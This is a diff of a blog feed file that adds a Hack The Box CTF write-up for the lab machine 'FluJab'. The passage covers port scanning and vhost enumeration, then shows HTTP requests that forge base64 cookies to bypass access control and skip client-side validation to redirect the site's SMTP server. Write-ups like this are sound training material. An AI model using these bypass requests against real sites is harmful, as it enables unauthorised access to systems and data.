@@ -1,4 +1,1006 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-06-10T16:36:57+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">pwnable.kr - bof</title><link href="http://localhost:4000/pwn/bof/" rel="alternate" type="text/html" title="pwnable.kr - bof" /><published>2019-06-10T00:00:00+02:00</published><updated>2019-06-10T00:00:00+02:00</updated><id>http://localhost:4000/pwn/bof</id><content type="html" xml:base="http://localhost:4000/pwn/bof/">&lt;hr /&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-06-15T16:07:52+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Hack The Box - FluJab</title><link href="http://localhost:4000/hack-the-box/flujab/" rel="alternate" type="text/html" title="Hack The Box - FluJab" /><published>2019-06-15T00:00:00+02:00</published><updated>2019-06-15T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/flujab</id><content type="html" xml:base="http://localhost:4000/hack-the-box/flujab/">&lt;hr /&gt;
+
+&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
+&lt;h4 id=&quot;hey-guys-today-flujab-retired-and-heres-my-write-up-about-it-this-machine-had-a-lot-of-rabbit-holes-and-trolls-which-made-it-hard-to-enjoy-the-machine-but-without-mentioning-those-annoying-things-this-machine-had-some-really-cool-web-exploitation-parts-like-cookie-manipulation-authentication-bypasses-and-most-importantly-an-interesting-sql-injection-vulnerability-ajenti-administration-panel-was-installed-on-the-box-and-i-could-get-credentials-for-it-by-exploiting-the-sqli--after-that-i-could-use-a-users-public-ssh-key-to-get-the-private-key-as-it-was-vulnerable-to-cve-2008-0166-then-i-escaped-rbash-and-exploited-a-vulnerable-version-of-screen-to-get-a-root-shell-its-a-linux-box-and-its-ip-is-101010124-i-added-it-to-etchosts-as-flujabhtb-lets-jump-right-in-&quot;&gt;Hey guys today FluJab retired and here’s my write-up about it. This machine had a lot of rabbit holes and trolls which made it hard to enjoy the machine. But without mentioning those annoying things this machine had some really cool web exploitation parts like cookie manipulation, authentication bypasses and most importantly an interesting &lt;code class=&quot;highlighter-rouge&quot;&gt;SQL&lt;/code&gt; injection vulnerability. &lt;code class=&quot;highlighter-rouge&quot;&gt;Ajenti&lt;/code&gt; administration panel was installed on the box and I could get credentials for it by exploiting the &lt;code class=&quot;highlighter-rouge&quot;&gt;SQLi&lt;/code&gt;,  After that I could use a user’s public ssh key to get the private key as it was vulnerable to &lt;code class=&quot;highlighter-rouge&quot;&gt;CVE-2008-0166&lt;/code&gt; then I escaped &lt;code class=&quot;highlighter-rouge&quot;&gt;rbash&lt;/code&gt; and exploited a vulnerable version of &lt;code class=&quot;highlighter-rouge&quot;&gt;screen&lt;/code&gt; to get a root shell. It’s a Linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.124&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;flujab.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC flujab.htb&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/flujab/1.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/flujab/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-got-ssh-on-port-22-http-on-ports-80-and-8080-and-https-on-port-443-theres-also-some-sort-of-virtual-hosting-as-we-can-see-from-the-nmap-scan-and-there-are-a-lot-of-domains-&quot;&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; on port 22, &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on ports 80 and 8080 and &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; on port 443. There’s also some sort of virtual hosting as we can see from the &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan and there are a lot of domains …&lt;/h4&gt;
+&lt;h4 id=&quot;we-can-also-check-the-ssl-certificate-manually-&quot;&gt;We can also check the &lt;code class=&quot;highlighter-rouge&quot;&gt;ssl&lt;/code&gt; certificate manually :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/3.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/flujab/4.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/flujab/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;http&quot;&gt;HTTP&lt;/h3&gt;
+&lt;h4 id=&quot;i-added-all-of-them-to-etchosts-and-checked-them-however-i-will-skip-the-rabbit-holes-in-the-write-up-because-its-just-a-waste-of-time-if-we-take-a-look-at-what-we-have-&quot;&gt;I added all of them to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; and checked them, However I will skip the rabbit holes in the write-up because it’s just a waste of time. If we take a look at what we have :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;the-machine-name-is-flujab-so-we-are-only-interested-in-&quot;&gt;The machine name is &lt;code class=&quot;highlighter-rouge&quot;&gt;flujab&lt;/code&gt; so we are only interested in :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;console.flujab.htb
+sys.flujab.htb
+smtp.flujab.htb
+freeflujab.htb
+flujab.htb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;we-saw-that-error-about-direct-ip-access-when-we-visited-flujabhtb-lets-check-the-other-4&quot;&gt;We saw that error about direct ip access when we visited &lt;code class=&quot;highlighter-rouge&quot;&gt;flujab.htb&lt;/code&gt;, Let’s check the other 4.&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;console.flujab.htb&lt;/code&gt; :
+&lt;img src=&quot;/images/hackthebox/flujab/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;just-a-troll-&quot;&gt;Just a troll !&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sys.flujab.htb&lt;/code&gt; :
+&lt;img src=&quot;/images/hackthebox/flujab/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;the-same-error-on-flujabhtb&quot;&gt;The same error on &lt;code class=&quot;highlighter-rouge&quot;&gt;flujab.htb&lt;/code&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp.flujab.htb&lt;/code&gt; :
+&lt;img src=&quot;/images/hackthebox/flujab/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-dont-have-any-credentials-for-that&quot;&gt;We don’t have any credentials for that.&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;freeflujab.htb&lt;/code&gt; : 
+&lt;img src=&quot;/images/hackthebox/flujab/10.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/images/hackthebox/flujab/11.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/images/hackthebox/flujab/12.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/images/hackthebox/flujab/13.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/images/hackthebox/flujab/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;that-one-is-interesting-i-tried-to-run-gobuster-but-there-was-a-wildcard-response-when-i-checked-manually-i-found-that-instead-of-responding-with-404-it-responds-with-a-redirection-to-httpsclownwarehtbcwerror_pagesphp-which-has-a-gif-of-a-strange-creepy-clown-&quot;&gt;That one is interesting. I tried to run &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; but there was a wildcard response. When I checked manually I found that instead of responding with &lt;code class=&quot;highlighter-rouge&quot;&gt;404&lt;/code&gt; it responds with a redirection to &lt;code class=&quot;highlighter-rouge&quot;&gt;https://clownware.htb/cwerror_pages.php&lt;/code&gt; which has a &lt;code class=&quot;highlighter-rouge&quot;&gt;gif&lt;/code&gt; of a strange creepy clown …&lt;/h4&gt;
+&lt;h4 id=&quot;note--i-checked-them-all-on-port-8080-too-but-i-always-got-the-direct-ip-access-error&quot;&gt;Note : I checked them all on port 8080 too but I always got the direct ip access error.&lt;/h4&gt;
+&lt;h4 id=&quot;i-started-burp-and-configured-the-scope-&quot;&gt;I started &lt;code class=&quot;highlighter-rouge&quot;&gt;burp&lt;/code&gt; and configured the scope :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/15.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/flujab/16.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/flujab/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;then-i-ran-the-spider-&quot;&gt;Then I ran the spider :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;results-&quot;&gt;Results :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/19.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/flujab/20.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/flujab/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;i-checked-the-requests-and-the-responses-of-different-pages-and-actions-i-noticed-in-one-of-the-responses-a-set-cookie-header-that-sets-a-cookie-called-modus-and-sets-the-path-for-it-to-smtp_config&quot;&gt;I checked the requests and the responses of different pages and actions. I noticed in one of the responses a &lt;code class=&quot;highlighter-rouge&quot;&gt;Set-Cookie&lt;/code&gt; header that sets a cookie called &lt;code class=&quot;highlighter-rouge&quot;&gt;Modus&lt;/code&gt; and sets the path for it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/?smtp_config&lt;/code&gt;.&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;i-requested-smtp_config-in-the-browser-and-looked-at-the-request-in-burp-&quot;&gt;I requested &lt;code class=&quot;highlighter-rouge&quot;&gt;/?smtp_config&lt;/code&gt; in the browser and looked at the request in &lt;code class=&quot;highlighter-rouge&quot;&gt;burp&lt;/code&gt; :&lt;/h4&gt;
+&lt;h4 id=&quot;request-&quot;&gt;Request :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;response-&quot;&gt;Response :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;the-response-was-a-redirection-to-denied-we-are-sending-3-cookies-in-every-request--modus--patient-and-registered-modus-and-registered-are-base-64-encoded-strings-while-patient-is-an-md5-hash&quot;&gt;The response was a redirection to &lt;code class=&quot;highlighter-rouge&quot;&gt;/?denied&lt;/code&gt;. We are sending 3 cookies in every request : &lt;code class=&quot;highlighter-rouge&quot;&gt;Modus&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;Patient&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Registered&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;Modus&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Registered&lt;/code&gt; are &lt;code class=&quot;highlighter-rouge&quot;&gt;base-64&lt;/code&gt; encoded strings while &lt;code class=&quot;highlighter-rouge&quot;&gt;Patient&lt;/code&gt; is an &lt;code class=&quot;highlighter-rouge&quot;&gt;md5&lt;/code&gt; hash.&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;modus--configurenull&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Modus&lt;/code&gt; = &lt;code class=&quot;highlighter-rouge&quot;&gt;Configure=Null&lt;/code&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;registered---f991b5fb6a2939471c7230b2db78225enull&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Registered&lt;/code&gt;  = &lt;code class=&quot;highlighter-rouge&quot;&gt;f991b5fb6a2939471c7230b2db78225e=Null&lt;/code&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;registered-is-using-the-same-hash-from-patient-after-some-guesses-i-found-that-this-hash-is-for-my-ip-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Registered&lt;/code&gt; is using the same hash from &lt;code class=&quot;highlighter-rouge&quot;&gt;Patient&lt;/code&gt;, After some guesses I found that this hash is for my ip :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;anyway-we-can-try-to-change-these-values-from-null-to-true-and-see-what-happens-&quot;&gt;Anyway we can try to change these values from &lt;code class=&quot;highlighter-rouge&quot;&gt;Null&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;True&lt;/code&gt; and see what happens :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/27.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/flujab/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;request--1&quot;&gt;Request :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /?smtp_config HTTP/1.1
+Host: freeflujab.htb
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d
+Connection: close
+Upgrade-Insecure-Requests: 1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;response--1&quot;&gt;Response :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
+Date: Thu, 15 Jun 2019 10:34:17 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+Server: ClownWare Proxy
+Content-Length: 3735
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;great-we-can-access-the-page-now&quot;&gt;Great, we can access the page now.&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;before-doing-anything-i-noticed-this-message-about-the-whitelist&quot;&gt;Before doing anything I noticed this message about the whitelist:&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/32.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/flujab/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;i-requested-whitelist-and-looked-at-the-response-&quot;&gt;I requested &lt;code class=&quot;highlighter-rouge&quot;&gt;/?whitelist&lt;/code&gt; and looked at the response :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/34.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/flujab/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;my-ip-wasnt-there-anyway-i-used-python-to-run-a-debugging-smtp-server-&quot;&gt;My ip wasn’t there. Anyway I used python to run a debugging &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; server :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python -m smtpd -n -c DebuggingServer 10.10.xx.xx:25&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/flujab/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;then-i-went-to-update-the-smtp-settings-and-add-mine-&quot;&gt;Then I went to update the &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; settings and add mine :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;but-i-got-this-message--a-valid-smtp-domain-address-is-required-so-i-checked-the-source-of-the-form-&quot;&gt;But I got this message : &lt;code class=&quot;highlighter-rouge&quot;&gt;A Valid SMTP Domain Address Is Required&lt;/code&gt;. So I checked the source of the form :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;form method=&quot;post&quot; action=&quot;?smtp_config&quot;&amp;gt;
+	&amp;lt;div class=&quot;row aln-center&quot;&amp;gt;
+		&amp;lt;div class=&quot;col-6 &quot;&amp;gt;
+				&amp;lt;input type=&quot;text&quot; name=&quot;mailserver&quot; id=&quot;email-server&quot; value=&quot;smtp.flujab.htb&quot; pattern=&quot;smtp.[A-Za-z]{1,255}.[A-Za-z]{2,5}&quot; title=&quot; A Valid SMTP Domain Address Is Required&quot;/&amp;gt;
+				&amp;lt;input type=&quot;hidden&quot; name=&quot;port&quot; id=&quot;port&quot; placeholder=&quot;25&quot; value=&quot;25&quot; /&amp;gt;
+		&amp;lt;/div&amp;gt;
+		&amp;lt;div class=&quot;col-12&quot;&amp;gt;
+		&amp;lt;p&amp;gt;
+			WARNING: Only &amp;lt;a href=&quot;/?whitelist&quot;&amp;gt;whitelisted sysadmins&amp;lt;/a&amp;gt; are authorized to 
+			access this page! &amp;lt;br \&amp;gt; If you are not supposed to 
+			change these settings then don't! whitelist will be 
+			auto-updated.
+		&amp;lt;/p&amp;gt;
+			&amp;lt;ul class=&quot;actions&quot;&amp;gt;
+				&amp;lt;li&amp;gt;&amp;lt;input type=&quot;submit&quot; class=&quot;style1&quot; value=&quot;Save Mail Server Config&quot; name=&quot;save&quot; /&amp;gt;&amp;lt;/li&amp;gt;
+			&amp;lt;/ul&amp;gt;
+		&amp;lt;/div&amp;gt;
+	&amp;lt;/div&amp;gt;
+&amp;lt;/form&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;its-relying-on-client-side-validation-check-&quot;&gt;It’s relying on client-side validation check :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;which-means-that-we-can-bypass-it-easily-by-sending-the-data-directly-in-the-request-&quot;&gt;Which means that we can bypass it easily by sending the data directly in the request :&lt;/h4&gt;
+&lt;h4 id=&quot;request--2&quot;&gt;Request :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /?smtp_config HTTP/1.1
+Host: freeflujab.htb
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 59
+
+mailserver=10.10.xx.xx&amp;amp;port=25&amp;amp;save=Save+Mail+Server+Config
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/41.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/flujab/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;note--i-checked-whitelist-again-and-my-ip-was-added-there-after-i-added-it-in-the-smtp-server-configuration&quot;&gt;Note : I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;/?whitelist&lt;/code&gt; again and my ip was added there after I added it in the &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; server configuration&lt;/h4&gt;
+&lt;h4 id=&quot;in-the-patients-section-there-were-some-pages-to-book-an-appointment-book-send-a-reminder-remind-or-to-cancel-an-appointment-cancel-to-book-an-appointment-we-need-a-valid-patients-name-after-some-enumeration-i-found-some-names-in-info-&quot;&gt;In the patients section there were some pages to book an appointment (&lt;code class=&quot;highlighter-rouge&quot;&gt;/?book&lt;/code&gt;), send a reminder (&lt;code class=&quot;highlighter-rouge&quot;&gt;/?remind&lt;/code&gt;) or to cancel an appointment (&lt;code class=&quot;highlighter-rouge&quot;&gt;/?cancel&lt;/code&gt;). To book an appointment we need a valid patient’s name. After some enumeration I found some names in &lt;code class=&quot;highlighter-rouge&quot;&gt;/?info&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/43.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;i-took-b-smith-and-after-some-guesses-i-got-the-right-name-which-was-bob-smith-&quot;&gt;I took B. Smith and after some guesses I got the right name which was Bob Smith :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/44.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/flujab/45.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;the-email-was-sent-and-we-can-see-that-in-the-python-smtp-server-&quot;&gt;The email was sent and we can see that in the python &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; server :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/46.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------                                                                                                       
+Date: Thu, 13 Jun 2019 14:47:23 +0100                                                                                                       
+To: bobsmith1975@gmail.com                                                                                                                  
+From: Nurse Julie &amp;lt;DutyNurse@flujab.htb&amp;gt;
+Subject: Flu Jab Appointment - Ref:NHS-943-475-5911
+Message-ID: &amp;lt;e1f9b14325c78abda96f5dd82694b7a4@freeflujab.htb&amp;gt;
+X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
+MIME-Version: 1.0
+Content-Type: text/plain; charset=iso-8859-1
+X-Peer: 10.10.10.124
+
+
+
+  Dear Mr Bob Smith,
+
+  Here are the details of your appointment at our surgery.
+  ________________________
+
+    VACCINATION
+    Routine Priority
+    ------------------
+    REF    : NHS-943-475-5911
+    Code   : Influ-022
+    Type   : Injection
+    Time   : 09:00
+    Date   : 2018-11-30
+    LOC    : Crick026
+  ________________________
+
+  We look forward to seeing you.
+  Have a nice day,
+
+  Nurse Julie Walters
+  Senior Staff Nurse
+  Cricklestone Doctors Surgery
+  NHS England.
+
+
+------------ END MESSAGE ------------
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;i-tried-to-go-to-cancel-&quot;&gt;I tried to go to &lt;code class=&quot;highlighter-rouge&quot;&gt;/?cancel&lt;/code&gt; :&lt;/h4&gt;
+&lt;h4 id=&quot;request--3&quot;&gt;Request :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/47.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /?cancel HTTP/1.1
+Host: freeflujab.htb
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d
+Connection: close
+Upgrade-Insecure-Requests: 1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;response--2&quot;&gt;Response :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/48.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+HTTP/1.1 302 Found
+Date: Thu, 13 Jun 2019 13:50:05 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+Location: /?ERROR=NOT_REGISTERED
+Server: ClownWare Proxy
+Content-Length: 2060
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;it-redirected-me-to-errornot_registered-i-looked-at-the-older-requests-and-i-noticed-the-set-cookie-headers-&quot;&gt;It redirected me to &lt;code class=&quot;highlighter-rouge&quot;&gt;/?ERROR=NOT_REGISTERED&lt;/code&gt;. I looked at the older requests and I noticed the &lt;code class=&quot;highlighter-rouge&quot;&gt;Set-Cookie&lt;/code&gt; headers :&lt;/h4&gt;
